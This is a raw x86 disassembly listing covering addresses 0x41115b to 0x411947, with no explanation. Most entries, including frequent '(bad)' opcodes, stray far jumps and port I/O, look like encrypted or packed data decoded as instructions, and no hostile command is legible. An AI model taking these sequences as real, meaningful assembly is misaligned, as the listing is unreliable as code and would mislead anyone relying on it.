  41115b:	fbld   TBYTE PTR [ebp-0x5fabdb6b]
  411161:	loopne 0x4110ef
  411163:	pop    ss
  411164:	retf   0x2d9a
  411167:	xchg   esi,eax
  411168:	iret   
  411169:	stos   BYTE PTR es:[edi],al
  41116a:	pop    ds
  41116b:	adc    al,BYTE PTR [ebx]
  41116d:	ins    DWORD PTR es:[edi],dx
  41116e:	push   ds
  41116f:	call   0x71ca:0x7056f321
  411176:	pusha  
  411177:	sar    BYTE PTR [ecx+0x616312a4],cl
  41117d:	test   al,0xf1
  41117f:	ins    BYTE PTR es:[edi],dx
  411180:	into   
  411181:	psrlw  mm6,QWORD PTR [ecx+0x2a]
  411185:	push   ecx
  411186:	neg    bh
  411188:	push   edi
  411189:	and    eax,0x8b2c3a9e
  41118e:	dec    esp
  41118f:	xor    eax,0x83fe6106
  411194:	fisubr DWORD PTR [ebx+0x45]
  411197:	fistp  QWORD PTR [edx]
  411199:	cmp    BYTE PTR ds:0x3bf9daeb,0xcd
  4111a0:	cdq    
  4111a1:	or     ebx,DWORD PTR [eax]
  4111a3:	mov    ch,0x39
  4111a5:	(bad)  
  4111a6:	fild   WORD PTR [eax]
  4111a8:	lea    edi,[esi-0x64f5d8f6]
  4111ae:	loop   0x4111dd
  4111b0:	das    
  4111b1:	rol    BYTE PTR [edx+0x5a],0xf9
  4111b5:	mov    bh,0xb1
  4111b7:	mov    ds:0xfddd94ba,eax
  4111bc:	cld    
  4111bd:	jno    0x4111c1
  4111bf:	and    DWORD PTR [edx+0x16aba8cb],ebp
  4111c5:	pop    eax
  4111c6:	mov    dl,0xe1
  4111c8:	imul   esp,DWORD PTR [edx+0x51637a4c],0xffffffff
  4111cf:	cmp    BYTE PTR [eax-0x4a],ch
  4111d2:	adc    al,0xe4
  4111d4:	fisubr WORD PTR [esi-0x44]
  4111d7:	out    0xe7,eax
  4111d9:	xor    eax,0x9796779a
  4111de:	loope  0x411237
  4111e0:	aad    0x27
  4111e2:	rcl    ah,0xfe
  4111e5:	jecxz  0x41119f
  4111e7:	inc    esi
  4111e8:	xchg   esp,eax
  4111e9:	aam    0x55
  4111eb:	adc    al,0xea
  4111ed:	xor    eax,0x4f1ebe43
  4111f2:	or     edi,ebx
  4111f4:	pop    eax
  4111f5:	cmp    al,0x77
  4111f7:	rol    BYTE PTR [edx+0xd],cl
  4111fa:	pop    edx
  4111fb:	mov    al,0x63
  4111fd:	cmp    eax,0x5f2495f3
  411202:	jecxz  0x411247
  411204:	adc    eax,ebx
  411206:	pop    edi
  411207:	mov    dl,0xd8
  411209:	and    ah,BYTE PTR [esi]
  41120b:	mov    ds:0xace5266d,al
  411210:	test   eax,0x5a0915e1
  411215:	xchg   DWORD PTR [eax-0x73],ebx
  411218:	sbb    ebx,edi
  41121a:	mov    ecx,0x4fa8898a
  41121f:	rcr    BYTE PTR ds:0xdace1152,0x66
  411226:	inc    ebp
  411227:	mov    dh,0xec
  411229:	and    edx,DWORD PTR [eax+0x9]
  41122c:	add    DWORD PTR [ebx],edi
  41122e:	pop    ecx
  41122f:	jae    0x411264
  411231:	push   ds
  411232:	xchg   DWORD PTR [ebp+0x2f],edi
  411235:	xchg   DWORD PTR [ebx+0x1f],ebp
  411238:	push   0xffffffea
  41123a:	push   ss
  41123b:	cli    
  41123c:	or     eax,0x8e0f99b5
  411241:	pop    ds
  411242:	jae    0x4112bf
  411244:	mov    edx,0x7bb2ead4
  411249:	sbb    esi,DWORD PTR ds:0xac30e991
  41124f:	cmp    al,0xb3
  411251:	push   ecx
  411252:	cs cli 
  411254:	push   0xffffffa7
  411256:	icebp  
  411257:	dec    eax
  411258:	mov    ebx,0x35f3435c
  41125d:	shl    BYTE PTR [ebx],1
  41125f:	sub    eax,DWORD PTR [ebx-0x15a02b0f]
  411265:	xchg   edi,eax
  411266:	fbld   TBYTE PTR [edi-0x3d1ee03e]
  41126c:	dec    ecx
  41126d:	sbb    eax,0xdbd2e810
  411272:	add    eax,0xd815385
  411277:	in     al,0x5b
  411279:	enter  0x869f,0xc2
  41127d:	xchg   DWORD PTR [bx+si-0x3689],ebp
  411282:	mov    ds:0xed88e04a,al
  411287:	mov    ah,BYTE PTR [edx-0x6e]
  41128a:	and    esp,DWORD PTR [edx+edi*1]
  41128d:	stc    
  41128e:	mov    BYTE PTR [eax-0x168d393f],cl
  411294:	dec    esi
  411295:	enter  0xe2c2,0x2b
  411299:	cwde   
  41129a:	int    0x36
  41129c:	popf   
  41129d:	lods   al,BYTE PTR ds:[esi]
  41129e:	xchg   ebp,eax
  41129f:	add    DWORD PTR [esi],esp
  4112a1:	iret   
  4112a2:	sub    esi,DWORD PTR [ebx-0x6059793b]
  4112a8:	jmp    FWORD PTR [ebp+0x43]
  4112ab:	(bad)  
  4112ac:	or     eax,0xb0c4fdc8
  4112b1:	mov    ds:0x42956937,al
  4112b6:	outs   dx,BYTE PTR ds:[esi]
  4112b7:	ds ins BYTE PTR es:[edi],dx
  4112b9:	mov    edx,0x9c8e7069
  4112be:	mov    ah,0xcb
  4112c0:	xchg   edi,eax
  4112c1:	mov    ebp,0x15bfc9dd
  4112c6:	inc    esp
  4112c7:	ret    
  4112c8:	push   ds
  4112c9:	repnz pop esp
  4112cb:	and    BYTE PTR [edx-0x15],cl
  4112ce:	jnp    0x411312
  4112d0:	xor    esi,edx
  4112d2:	out    dx,eax
  4112d3:	icebp  
  4112d4:	dec    esi
  4112d5:	loopne 0x41126f
  4112d7:	mov    cl,0x39
  4112d9:	mov    bh,0x13
  4112db:	pop    ss
  4112dc:	push   0x802af6ac
  4112e1:	shr    BYTE PTR [ecx+0x5a],1
  4112e4:	sbb    al,0xe9
  4112e6:	mov    eax,ds:0xe26478f7
  4112eb:	test   al,0xc
  4112ed:	cld    
  4112ee:	lods   eax,DWORD PTR ds:[esi]
  4112ef:	jb     0x4112ef
  4112f1:	mov    dh,0x91
  4112f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112f4:	dec    eax
  4112f5:	in     eax,0x74
  4112f7:	outs   dx,DWORD PTR ds:[esi]
  4112f8:	pop    edi
  4112f9:	aas    
  4112fa:	loopne 0x41129b
  4112fc:	jb     0x41133a
  4112fe:	mov    eax,0x24de5271
  411303:	out    dx,al
  411304:	jecxz  0x411350
  411306:	adc    eax,DWORD PTR [ebx+ebx*2]
  411309:	mov    bl,0x64
  41130b:	(bad)  
  41130c:	vpunpckhbw xmm2,xmm7,XMMWORD PTR [edi]
  411310:	pop    ebp
  411311:	and    eax,0xb6c75b55
  411316:	inc    edx
  411317:	mov    ch,0x8d
  411319:	gs xchg ecx,eax
  41131b:	jbe    0x4112d2
  41131d:	jmp    0x8d82:0xb14c824a
  411324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411325:	aad    0x87
  411327:	shl    dl,0xa6
  41132a:	dec    ebx
  41132b:	stos   BYTE PTR es:[edi],al
  41132c:	fimul  DWORD PTR [ebx+0x32eaf3e3]
  411332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411333:	mov    BYTE PTR [edx],0x42
  411336:	sub    DWORD PTR [esi+0x657a9e36],edi
  41133c:	dec    esp
  41133d:	adc    ecx,esi
  41133f:	pop    ebx
  411340:	mov    al,0xc8
  411342:	or     al,0xf3
  411344:	pop    ss
  411345:	mov    dh,0xe
  411347:	mov    eax,0x6f5ae107
  41134c:	add    eax,0xfec4c912
  411351:	sub    eax,0xc776baec
  411356:	adc    esp,DWORD PTR ds:0xf5892cfd
  41135c:	mov    ah,BYTE PTR es:[ecx-0x3b]
  411360:	jmp    0xf7ee4f6e
  411365:	mov    bh,0xec
  411367:	std    
  411368:	mov    dh,0x28
  41136a:	sti    
  41136b:	stos   BYTE PTR es:[edi],al
  41136c:	test   ebx,edx
  41136e:	and    ah,BYTE PTR [ecx]
  411370:	lods   al,BYTE PTR ds:[esi]
  411371:	or     eax,0xe8e5533b
  411376:	jbe    0x4113d9
  411378:	adc    DWORD PTR [ebp+0x4c0eb5af],esi
  41137e:	pop    ecx
  41137f:	repz ja 0x411349
  411382:	ret    0x75ca
  411385:	sub    ebx,edi
  411387:	push   ecx
  411388:	xchg   esi,eax
  411389:	imul   esi,DWORD PTR [ebp-0x1f252757],0x9758049b
  411393:	dec    esp
  411394:	out    0x80,eax
  411396:	repnz gs jmp 0x875a:0xadec2248
  41139f:	dec    edi
  4113a0:	pop    ebp
  4113a1:	arpl   WORD PTR [ebx-0x67],cx
  4113a4:	cvtpi2ps xmm5,QWORD PTR [esp+eax*4-0x70]
  4113a9:	pop    ds
  4113aa:	repz push ecx
  4113ac:	mov    ecx,0xdb6a2da5
  4113b1:	call   0x3142:0xc765705b
  4113b8:	test   BYTE PTR [edi+0x6b],dh
  4113bb:	push   ds
  4113bc:	and    eax,0x3e5d7a15
  4113c1:	adc    dh,BYTE PTR [eax+0x6f97d3c0]
  4113c7:	in     al,0x7b
  4113c9:	xchg   DWORD PTR [ebx-0x33],esp
  4113cc:	cmp    DWORD PTR [ebx],edx
  4113ce:	loopne 0x4113b9
  4113d0:	xchg   ebp,eax
  4113d1:	pop    esi
  4113d2:	add    al,0xba
  4113d4:	add    eax,0x8f1ad950
  4113d9:	pop    ecx
  4113da:	xchg   BYTE PTR [ebp+0x79],dl
  4113dd:	xor    BYTE PTR gs:[ecx-0x26e9e475],al
  4113e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e5:	mov    ecx,0xd4781588
  4113ea:	pushf  
  4113eb:	out    dx,al
  4113ec:	add    BYTE PTR [ecx+esi*1-0x2f],0x99
  4113f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f2:	hlt    
  4113f3:	cmp    esi,esi
  4113f5:	xchg   esp,eax
  4113f6:	push   cs
  4113f7:	xchg   ecx,eax
  4113f8:	stc    
  4113f9:	cmp    cl,BYTE PTR [esi+0x55]
  4113fc:	xor    esi,DWORD PTR [edi]
  4113fe:	mov    ds:0x47095327,eax
  411403:	push   ebp
  411404:	nop
  411405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411406:	cld    
  411407:	ins    DWORD PTR es:[edi],dx
  411408:	push   esi
  411409:	mov    dh,0x66
  41140b:	cwde   
  41140c:	scas   al,BYTE PTR es:[edi]
  41140d:	sub    al,0x9b
  41140f:	push   esp
  411410:	int    0x89
  411412:	jl     0x41141b
  411414:	pop    es
  411415:	push   ecx
  411416:	ret    
  411417:	and    eax,0x51ebe81e
  41141c:	(bad)  
  41141d:	iret   
  41141e:	aam    0xe7
  411420:	ret    
  411421:	cs cdq 
  411423:	in     eax,0xb7
  411425:	jmp    0x7880:0x2a8d7d75
  41142c:	and    BYTE PTR [ecx],ch
  41142e:	and    BYTE PTR [esi-0x37],dh
  411431:	push   ecx
  411432:	jo     0x411445
  411434:	out    0x32,al
  411436:	adc    dh,BYTE PTR [edi]
  411438:	pop    ss
  411439:	aas    
  41143a:	add    DWORD PTR [eax-0x17cb716c],0x14
  411441:	jno    0x41148b
  411443:	inc    esi
  411444:	dec    ebx
  411445:	mov    cl,0x9c
  411447:	inc    edx
  411448:	add    eax,DWORD PTR [ebx+eax*2+0x4c6e9c7a]
  41144f:	xchg   ebp,eax
  411450:	push   0xd29c33ed
  411455:	scas   eax,DWORD PTR es:[edi]
  411456:	adc    eax,0xc9416835
  41145b:	loop   0x411499
  41145d:	sbb    ch,BYTE PTR [ebx]
  41145f:	xchg   BYTE PTR [edx+0xc],al
  411462:	xchg   ecx,eax
  411463:	mov    dl,0x57
  411465:	loop   0x41143f
  411467:	cmp    DWORD PTR [edi+0x11ae0c4c],eax
  41146d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146e:	lods   eax,DWORD PTR ds:[esi]
  41146f:	mov    edi,0x255eb4ae
  411474:	pop    edi
  411475:	repz sbb bh,BYTE PTR [eax+eiz*1]
  411479:	inc    ebx
  41147a:	pop    ss
  41147b:	icebp  
  41147c:	xor    esp,0x43
  41147f:	push   esi
  411480:	sbb    eax,0x17777c47
  411485:	cmc    
  411486:	and    eax,0x13e8bca4
  41148b:	bound  edi,QWORD PTR [ebp+0x20]
  41148e:	add    BYTE PTR [esi-0xe],0xd4
  411492:	jmp    FWORD PTR [ebp+0x4acae4f6]
  411498:	ins    DWORD PTR es:[edi],dx
  411499:	(bad)  
  41149a:	fmul   DWORD PTR [edi]
  41149c:	fs stos DWORD PTR es:[edi],eax
  41149e:	mov    dh,0x1f
  4114a0:	into   
  4114a1:	xor    DWORD PTR [edx],edx
  4114a3:	sbb    cl,BYTE PTR [edi+edx*4-0x1ad0e845]
  4114aa:	push   ss
  4114ab:	fimul  WORD PTR [eax+0x4f]
  4114ae:	loope  0x411468
  4114b0:	mul    eax
  4114b2:	pushf  
  4114b3:	jg     0x411462
  4114b5:	test   al,0xc9
  4114b7:	and    ebx,ebp
  4114b9:	push   esi
  4114ba:	cmp    DWORD PTR [edx],ecx
  4114bc:	cmp    eax,0x27a385bc
  4114c1:	imul   edx,DWORD PTR [edi+0x3f436238],0x51ef7b8a
  4114cb:	ret    
  4114cc:	fadd   QWORD PTR [ebp-0x70]
  4114cf:	jbe    0x411502
  4114d1:	test   DWORD PTR [esi],ebp
  4114d3:	push   ebp
  4114d4:	and    ebp,DWORD PTR [esi+0x76]
  4114d7:	retf   0xf8dc
  4114da:	stos   DWORD PTR es:[edi],eax
  4114db:	cwde   
  4114dc:	outs   dx,DWORD PTR ds:[esi]
  4114dd:	mov    esp,0xa0bc679d
  4114e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e3:	cs or  eax,0xfdbc599b
  4114e9:	and    bl,BYTE PTR [ecx+0x5a709663]
  4114ef:	xor    BYTE PTR [bp+si-0xc],ch
  4114f3:	rcr    ah,0xae
  4114f6:	nop
  4114f7:	or     eax,0xa2371aa8
  4114fc:	pop    ebp
  4114fd:	add    al,BYTE PTR [eax-0x48]
  411500:	ja     0x4114c4
  411502:	ins    DWORD PTR es:[edi],dx
  411503:	mov    al,0x32
  411505:	push   esp
  411506:	push   ss
  411507:	icebp  
  411508:	stc    
  411509:	and    DWORD PTR [ebx],0xffffff98
  41150c:	test   al,0x69
  41150e:	jae    0x411498
  411510:	cmp    BYTE PTR [edx-0x3c5ff746],bh
  411516:	nop
  411517:	jmp    0x7ab2:0xe3890c73
  41151e:	push   esi
  41151f:	gs sti 
  411521:	pop    eax
  411522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411523:	inc    edi
  411524:	jle    0x4114e4
  411526:	std    
  411527:	pop    ecx
  411528:	iret   
  411529:	mov    ebx,0x25e34356
  41152e:	sub    DWORD PTR ds:0x9b2b669,0xffffffc3
  411535:	rcr    bl,1
  411537:	mov    WORD PTR [edi-0x19d56c04],?
  41153d:	jl     0x41158a
  41153f:	mov    edi,0x684b9aae
  411544:	sub    ebx,DWORD PTR [edx-0x19282649]
  41154a:	mul    BYTE PTR [eax]
  41154c:	xor    eax,DWORD PTR [ecx+edi*8]
  41154f:	push   ecx
  411550:	cs jmp 0xe2a1:0x2850
  411557:	call   0x23c7f7b
  41155c:	ja     0x4115d6
  41155e:	and    BYTE PTR [ebx-0x1],dl
  411561:	test   BYTE PTR [ecx+0x47],dh
  411564:	fist   DWORD PTR [edx-0x432d4edc]
  41156a:	mov    dl,BYTE PTR [ecx-0x16ed4f86]
  411570:	iret   
  411571:	cwde   
  411572:	dec    eax
  411573:	adc    BYTE PTR [ebx+0x5b],0xa3
  411577:	cmp    ecx,eax
  411579:	sbb    dh,0xdf
  41157c:	out    dx,eax
  41157d:	fidiv  DWORD PTR [eax+edx*2-0x4b]
  411581:	push   0x2ade5652
  411586:	loopne 0x4115e7
  411588:	cmp    al,BYTE PTR [eiz*2+0x10524cd6]
  41158f:	into   
  411590:	bound  esp,QWORD PTR [ecx+ebx*8+0x3612bac2]
  411597:	push   edi
  411598:	mov    dh,0x6
  41159a:	push   ss
  41159b:	ret    0xcd7f
  41159e:	lods   eax,DWORD PTR fs:[esi]
  4115a0:	add    al,0xdb
  4115a2:	outs   dx,BYTE PTR ds:[esi]
  4115a3:	mov    esi,0x66e264a8
  4115a8:	inc    ecx
  4115a9:	or     eax,0x910384b7
  4115ae:	dec    esi
  4115af:	rcl    BYTE PTR [edi-0x3452c153],0x68
  4115b6:	(bad)  
  4115b7:	cdq    
  4115b8:	shl    BYTE PTR [ebx+0x42],1
  4115bb:	add    eax,0x1f1580bb
  4115c0:	lds    esi,FWORD PTR [ecx]
  4115c2:	mov    bl,0x2c
  4115c4:	std    
  4115c5:	rcr    BYTE PTR [ebx],cl
  4115c7:	dec    eax
  4115c8:	sbb    DWORD PTR [edx-0x2e],eax
  4115cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115cc:	mov    ebp,0x3a88809f
  4115d1:	stc    
  4115d2:	push   edi
  4115d3:	jo     0x4115b8
  4115d5:	lahf   
  4115d6:	rcr    DWORD PTR [ebp+0x2446c6f6],0xbe
  4115dd:	xchg   BYTE PTR [ebp+0x385d8982],dh
  4115e3:	xchg   BYTE PTR [edx-0x769a4992],dh
  4115e9:	in     eax,dx
  4115ea:	les    ebp,FWORD PTR [edx]
  4115ec:	jno    0x4115a1
  4115ee:	xor    BYTE PTR [ebx+0x4696451f],0x3
  4115f5:	mov    bl,0xcd
  4115f7:	mov    ss,WORD PTR [edx-0x6b43abc8]
  4115fd:	cld    
  4115fe:	lahf   
  4115ff:	hlt    
  411600:	cmp    eax,0xcae278ba
  411605:	enter  0x5243,0xa5
  411609:	fst    DWORD PTR [esi+0x18cc7b0]
  41160f:	adc    al,ah
  411611:	pusha  
  411612:	inc    edi
  411613:	mov    bl,0x2a
  411615:	jbe    0x4115cb
  411617:	in     eax,dx
  411618:	xlat   BYTE PTR ds:[ebx]
  411619:	sub    ah,BYTE PTR [edx+0x47]
  41161c:	mov    ecx,0x10643185
  411621:	scas   eax,DWORD PTR es:[edi]
  411622:	addr16 pop eax
  411624:	ss clc 
  411626:	jecxz  0x4115e3
  411628:	mov    fs,eax
  41162a:	xor    eax,0x868ae5f9
  41162f:	loopne 0x41165a
  411631:	xchg   BYTE PTR [eax],ch
  411633:	imul   DWORD PTR [edx+0x167d83e8]
  411639:	adc    ecx,DWORD PTR [edx]
  41163b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41163c:	jecxz  0x41169b
  41163e:	jno    0x41162c
  411640:	pop    eax
  411641:	jmp    esp
  411643:	jae    0x411631
  411645:	push   cs
  411646:	lods   eax,DWORD PTR ds:[esi]
  411647:	repnz fcom DWORD PTR ds:0xea1e601a
  41164e:	and    BYTE PTR [esi],ah
  411650:	inc    ebp
  411651:	test   al,0xfd
  411653:	cs jno 0x411633
  411656:	mov    ebx,0x3384d807
  41165b:	mov    fs,WORD PTR [ebp+0x638672cb]
  411661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411662:	test   DWORD PTR [edx+0x6614a646],ebp
  411668:	inc    esi
  411669:	push   0x7e
  41166b:	mov    ebp,0xdc9f6f3a
  411670:	cmc    
  411671:	mov    bl,0xe8
  411673:	(bad)  
  411674:	push   0x1e2a7ff1
  411679:	hlt    
  41167a:	xabort 0x60
  41167d:	das    
  41167e:	pop    es
  41167f:	sbb    eax,0x130c1912
  411684:	add    al,0x70
  411686:	xlat   BYTE PTR ds:[ebx]
  411687:	gs sub al,0x46
  41168a:	leave  
  41168b:	jge    0x4116fb
  41168d:	(bad)  
  41168f:	mov    eax,ds
  411691:	clc    
  411692:	sbb    DWORD PTR [esi],0xffffffc1
  411695:	xchg   DWORD PTR [ebx],ebx
  411697:	mov    DWORD PTR ds:0xfdc8c00d,edx
  41169d:	dec    ebx
  41169e:	shr    eax,1
  4116a0:	and    al,0x89
  4116a2:	in     al,dx
  4116a3:	(bad)  
  4116a4:	nop
  4116a5:	mov    edx,0x6fd67a33
  4116aa:	ret    
  4116ab:	ret    0xaefb
  4116ae:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4116b0:	stos   DWORD PTR es:[edi],eax
  4116b1:	in     al,0x5b
  4116b3:	xor    DWORD PTR [edx],0xea24bc0f
  4116b9:	xchg   ebp,eax
  4116ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116bb:	int    0x20
  4116bd:	pop    edi
  4116be:	and    ah,BYTE PTR [eax+0x6f]
  4116c1:	stos   BYTE PTR es:[edi],al
  4116c2:	pop    eax
  4116c3:	in     al,dx
  4116c4:	div    DWORD PTR [esi+0x76c1c119]
  4116ca:	stos   BYTE PTR es:[edi],al
  4116cb:	repz push ecx
  4116cd:	sar    ebx,0x76
  4116d0:	add    DWORD PTR [ebx-0x23],0x9d2c6fc7
  4116d7:	jbe    0x4116e7
  4116d9:	icebp  
  4116da:	mov    ch,0xbc
  4116dc:	pop    ebp
  4116dd:	sub    al,0x5c
  4116df:	aas    
  4116e0:	or     DWORD PTR [edx+0x39],esi
  4116e3:	enter  0x4204,0x1b
  4116e7:	je     0x411696
  4116e9:	or     ah,BYTE PTR [ecx+0x54b515a0]
  4116ef:	pop    ds
  4116f0:	jl     0x411738
  4116f2:	mov    dh,0x75
  4116f4:	fild   WORD PTR [edi+0x2a5efb13]
  4116fa:	imul   esp,DWORD PTR [edi+0x58],0xa626344b
  411701:	shl    DWORD PTR [ecx],0x96
  411704:	xor    al,ah
  411706:	xchg   BYTE PTR [edi],ch
  411708:	add    edx,ebp
  41170a:	and    DWORD PTR [ebx-0x31],eax
  41170d:	mov    eax,ds:0x3eb793db
  411712:	mov    ah,0x2b
  411714:	mov    DWORD PTR [eax-0x4],ebp
  411717:	and    al,0xe2
  411719:	lods   eax,DWORD PTR ds:[esi]
  41171a:	enter  0x7f8e,0x62
  41171e:	shr    DWORD PTR [esi],0x5f
  411721:	imul   esp,DWORD PTR fs:[edi],0x9
  411725:	dec    ebp
  411726:	add    bl,BYTE PTR [ebp-0x5b]
  411729:	fld    DWORD PTR [ebx]
  41172b:	push   edi
  41172c:	xchg   esp,eax
  41172d:	sbb    DWORD PTR [ebx-0x6eddca50],edi
  411733:	push   ebx
  411734:	jns    0x41179b
  411736:	pushf  
  411737:	jno    0x411753
  411739:	sahf   
  41173a:	fwait
  41173b:	dec    BYTE PTR [edi+0x5115e4fd]
  411741:	hlt    
  411742:	jno    0x411748
  411744:	pop    esp
  411745:	cmc    
  411746:	adc    DWORD PTR [esp+edi*1-0x1117415c],edx
  41174d:	jge    0x4116f3
  41174f:	ror    BYTE PTR [edx+0x7],cl
  411752:	add    eax,0x5e31f935
  411757:	xchg   esp,eax
  411758:	push   ebx
  411759:	mov    edi,0x28404bff
  41175e:	ins    DWORD PTR es:[edi],dx
  41175f:	ins    BYTE PTR es:[edi],dx
  411760:	mov    ds:0x339dda4b,eax
  411765:	test   ecx,esi
  411767:	sub    eax,0x635dd032
  41176c:	dec    esi
  41176d:	data16 xor ch,ch
  411770:	fnsave gs:[ecx]
  411773:	inc    ecx
  411774:	mov    DWORD PTR [ebx-0x31],edx
  411777:	mov    WORD PTR [edi-0x47],?
  41177a:	sahf   
  41177b:	loop   0x411738
  41177d:	popa   
  41177e:	cld    
  41177f:	push   0x5e1b995b
  411784:	imul   edi,DWORD PTR [edx-0x3e882ec3],0x2463bf03
  41178e:	lods   al,BYTE PTR ds:[esi]
  41178f:	xlat   BYTE PTR ds:[ebx]
  411790:	in     al,0xcc
  411792:	pushf  
  411793:	add    esp,DWORD PTR [esi-0x1a]
  411796:	(bad)  
  411797:	jle    0x41177d
  411799:	pop    edi
  41179a:	je     0x4117dc
  41179c:	enter  0x743e,0xb3
  4117a0:	dec    edx
  4117a1:	add    al,0xd3
  4117a3:	bound  esi,QWORD PTR [edi]
  4117a5:	(bad)  
  4117a6:	and    ebp,edx
  4117a8:	cli    
  4117a9:	test   BYTE PTR [edi-0x58a3a5a9],ch
  4117af:	sar    BYTE PTR [eax-0x4c1e3215],0xbc
  4117b6:	dec    al
  4117b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117b9:	aaa    
  4117ba:	jmp    0xf04d:0x2791a5bb
  4117c1:	and    BYTE PTR [ebx],dl
  4117c3:	das    
  4117c4:	dec    edx
  4117c5:	fadd   DWORD PTR [edi-0x481073ae]
  4117cb:	pop    ss
  4117cc:	xchg   DWORD PTR [ecx],ebx
  4117ce:	pop    ecx
  4117cf:	mov    ah,0x1e
  4117d1:	mov    al,BYTE PTR [eax+ecx*1+0xf]
  4117d5:	adc    dh,BYTE PTR [ebx+0x19809637]
  4117db:	mov    ecx,0x1a44c203
  4117e0:	jbe    0x411763
  4117e2:	and    al,0xcb
  4117e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e5:	and    BYTE PTR [ebx-0x32],dl
  4117e8:	int    0x72
  4117ea:	mov    eax,ds:0x37de389a
  4117ef:	sub    bh,BYTE PTR [edi+edi*8-0x7d66211e]
  4117f6:	dec    eax
  4117f7:	iret   
  4117f8:	inc    edx
  4117f9:	push   ecx
  4117fa:	fisubr DWORD PTR [edx]
  4117fc:	and    dl,ah
  4117fe:	jmp    0x411838
  411800:	dec    esp
  411801:	push   cs
  411802:	les    edx,FWORD PTR [ebp-0x16db178f]
  411808:	addr16 lock popf 
  41180b:	push   es
  41180c:	popa   
  41180d:	mov    ecx,0xf48ff635
  411812:	pop    esi
  411813:	daa    
  411814:	xor    al,0x9c
  411816:	in     eax,dx
  411817:	push   0xfffffffb
  411819:	(bad)  [edi]
  41181b:	adc    al,0x44
  41181d:	test   al,0x3c
  41181f:	mov    ch,BYTE PTR [esp+ebp*1-0x52f8ab97]
  411826:	les    esp,FWORD PTR [esi]
  411828:	inc    ebx
  411829:	push   0x5385b7e3
  41182e:	retf   
  41182f:	fdivr  st,st(5)
  411831:	rep ins DWORD PTR es:[edi],dx
  411833:	xchg   esi,eax
  411834:	or     DWORD PTR [ecx],edi
  411836:	or     DWORD PTR es:[edi],ecx
  411839:	xor    eax,0xd950f183
  41183e:	data16 daa 
  411840:	pop    esp
  411841:	mov    BYTE PTR [edi-0x49],al
  411844:	pop    ecx
  411845:	sub    al,0x3d
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x1b30ba54
  411868:	pushf  
  411869:	mov    ?,esp
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x2e]
  411873:	mov    edi,ebp
  411875:	push   eax
  411876:	hlt    
  411877:	loope  0x411858
  411879:	push   ss
  41187a:	enter  0x1004,0xc7
  41187e:	mov    esp,0x5f07880b
  411884:	inc    esi
  411885:	and    al,0x9d
  411887:	mov    dl,0xab
  411889:	rcl    DWORD PTR [esi+ecx*2],1
  41188c:	mov    ecx,0x6b523370
  411891:	inc    eax
  411892:	iret   
  411893:	mov    esi,0xd77e044
  411898:	lock out dx,eax
  41189a:	sahf   
  41189b:	ror    BYTE PTR [edi+0x63],cl
  41189e:	pop    ebx
  41189f:	xlat   BYTE PTR ds:[ebx]
  4118a0:	jle    0x411897
  4118a2:	call   0x3cdb:0xd0efcfc5
  4118a9:	test   eax,0x67a3e512
  4118ae:	out    dx,eax
  4118af:	cmp    esi,eax
  4118b1:	jne    0x4118a3
  4118b3:	aad    0x52
  4118b5:	call   0x1a8c:0x52e11605
  4118bc:	mov    WORD PTR [ecx-0x412a6ed5],ss
  4118c2:	ret    0x974b
  4118c5:	in     eax,dx
  4118c6:	call   0xe79f:0x6b1b5369
  4118cd:	shl    DWORD PTR [edi+0x25],cl
  4118d0:	shl    DWORD PTR [edx-0x652cc992],cl
  4118d6:	push   esp
  4118d7:	aam    0x7e
  4118d9:	popf   
  4118da:	mov    ecx,0x165fe0f5
  4118df:	aad    0x11
  4118e1:	push   esi
  4118e2:	inc    edi
  4118e3:	ds (bad) 
  4118e5:	mov    esi,0xbe4bd2ca
  4118ea:	popf   
  4118eb:	dec    ecx
  4118ec:	xchg   ecx,eax
  4118ed:	test   al,0x50
  4118ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118f0:	repz (bad) 
  4118f2:	mov    ebx,0xffc6db08
  4118f7:	xrelease mov BYTE PTR [ecx],bh
  4118fa:	and    dl,BYTE PTR [edi-0x459e8840]
  411900:	mov    ebx,0xa768ecad
  411905:	xchg   esp,eax
  411906:	(bad)
  41190a:	pop    ebx
  41190b:	push   ss
  41190c:	out    0x3a,al
  41190e:	dec    ecx
  41190f:	inc    eax
  411910:	pop    esi
  411911:	inc    ebx
  411912:	outs   dx,BYTE PTR ds:[esi]
  411913:	cmp    eax,0xff3eb404
  411918:	adc    eax,0xe5c6dc76
  41191d:	sbb    ch,bh
  41191f:	aam    0xde
  411921:	inc    ebx
  411922:	inc    esp
  411923:	xor    edx,ecx
  411925:	jmp    0x411936
  411927:	imul   esi,eax,0x1a
  41192a:	push   eax
  41192b:	scas   eax,DWORD PTR es:[edi]
  41192c:	jge    0x411929
  41192e:	cmc    
  41192f:	jb     0x4118ce
  411931:	(bad)  
  411932:	aad    0xa1
  411934:	or     ch,ah
  411936:	in     eax,0x7b
  411938:	mov    ah,al
  41193a:	cmc    
  41193b:	cli    
  41193c:	mov    ch,0x5
  41193e:	mov    dl,0xe1
  411940:	mov    ebp,0x646c5839
  411945:	cmp    bh,ah
  411947:	movntps XMMWORD PTR [edx-0x223251ff],xmm6
